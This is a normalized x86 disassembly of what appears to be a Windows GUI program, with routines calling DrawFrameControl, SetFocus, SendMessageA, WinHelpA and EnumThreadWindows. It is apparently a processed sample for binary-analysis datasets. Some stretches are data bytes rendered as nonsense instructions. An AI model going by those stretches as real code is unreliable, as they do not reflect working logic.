mov eax ebx
call sub_42ef80
test al al
je r-xdata
push 0x15
call GetSystemMetrics
add [ ebp - 0x18 ] eax
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41d1bc
push eax
call DrawFrameControl
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41d1bc
push eax
call DrawFrameControl
jmp r-xdata
sub_430a10
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_439838
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_430a34
push ebx
mov ebx eax
mov eax ebx
call sub_443908
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_430a6c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_430ad0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43986c
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_430b24
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43e610
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_430b78
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_430b9c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_43b554
mov eax ebx
mov si 0xffb5
call sub_403430
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_43db40
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_403430
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_430c14
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_42a64c
mov ebx eax
mov eax ebx
call sub_42a72c
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_43db40
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_42a82c
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_430c60
push ebx
push esi
mov esi edx
mov ebx eax
call sub_42a64c
call sub_42a72c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_43bf94
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_430c8c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a9cc
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_430cc4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_430ad0
mov edx 0x71
mov eax esi
call sub_436b14
mov edx 0x11
mov eax esi
call sub_436b38
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_430d2c
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403430
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_430d6c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_43a870
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43a834
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_443b9c
sub_430e28
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x211 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43dd74
mov eax [ ebp - 0x4 ]
call sub_43de44
test al al
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call SendMessageA
push ebp
call sub_430d6c
pop ecx
mov eax [ ebp - 0x4 ]
call sub_436f64
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403430
sub_430eb4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_430c8c
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_43a8f8
mov eax ebx
mov si 0xffc8
call sub_403430
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_430f0b
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x641d173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x211 ]
push eax
push 0xf1
mov eax ebx
call sub_43db40
push eax
call SendMessageA
pop ebx
retn
sub_430f40
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_437358
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_44e044
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_43cfc4
mov eax ebx
mov si 0xffb8
call sub_403430
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430fbc
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_430fc4
push esi
mov esi eax
mov ax [ edx + 0x6 ]
sub ax 0x1
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
retn
sub ax 0x4
je r-xdata
mov eax esi
mov si 0xffe9
call sub_403430
jmp r-xdata
pop esi
retn
sub_430ff4
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431020
retn
sub_431120
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4439ec
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_43115c
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431188
retn
sub_431194
push ss
inc esi
add [ edi ] al
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_431c84
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431afe
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403f90
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_407d14
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_431bdc
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_407d14
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_403fc0
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_431340
mov eax [ ebp - 0x14 ]
call sub_40442c
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_43122c
or eax 0x17004312
adc al [ ebx ]
and [ edx ] edx
inc ebx
add ch al
adc [ ebx ] eax
int 0x11
inc ebx
add ch dl
adc [ ebx ] eax
fst [ ecx ]
inc ebx
add ch ah
adc [ ebx ] eax
pop ss
cmp ch [ edx + edx ]
inc ebx
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
in eax dx
adc [ ebx ] eax
cmc
adc [ ebx ] eax
std
adc [ ebx ] eax
add eax 0xa5004312
adc [ ebx ] eax
lodsd [ esi ]
adc [ ebx ] eax
mov ch 0x11
inc ebx
add [ ebp - 0x62ffbcef ] bh
cmp ch [ edx + edx ]
inc ebx
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 4 - 0x4 ] ah
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ ebx ] eax
add eax [ eax ]
add [ eax ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
mov ebp 0x9d004311
cmp ch [ edx + edx ]
inc ebx
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx ] dl
inc ebx
add [ eax + 0x12 ] dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx + edx ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ch
adc eax [ ebx ]
and al 0x0
add [ eax ] al
xchg esp eax
adc [ eax ] eax
xor al 0x40
add [ eax ] ch
push esi
inc eax
add [ esi + edx * 2 ] dh
inc eax
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ esi + edx * 2 + 0x40 ] al
add al ch
xor [ eax ] eax
mov ah 0x1d
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] dl
add [ eax ] al
sub [ eax ] 0x42
add [ eax + eax ] bl
add [ eax ] al
push cs
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f6c
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404004
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403fc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4313fc
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4042ec
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_431340
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f6c
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404004
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403fc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4313fc
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4042ec
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_431410
push ebx
mov ebx eax
mov eax ebx
call sub_431740
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_4055a8
sub_43144c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_431340
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4314ba
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_4314c4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_431438
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4042ec
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431553
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
sub_43155f
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_431c84
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4315ee
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_431340
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43156c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_431c84
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4315ee
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_431340
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_4315f4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_431340
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408a20
mov eax ebx
call sub_431c84
test al al
je r-xdata
mov ecx sub_431194
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4316f3
lea eax [ ebp - 0x1c ]
call sub_403f6c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_431340
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_431bdc
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_403fc0
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_40442c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43175c
push ebx
mov ebx eax
mov eax ebx
call sub_431740
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_4055a8
pop ebx
retn
mov eax rw-data
call sub_4055a8
sub_43178c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4317eb
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_431340
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_4317f4
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_4089e0
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_431340
mov eax ebx
call sub_431c84
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4318f1
lea eax [ ebp - 0x110 ]
call sub_403f6c
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_4041dc
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_431bdc
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_4041dc
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_431908
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431971
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_431340
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_43197c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_431340
mov eax ebx
call sub_431c84
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431a03
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_431bdc
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_431b0c
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408444
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_431b67
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408420
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_431bdc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_40441c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_431bc0
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431c59
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407aa4
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_431c68
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_431c84
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_431bc0
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_431c64
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
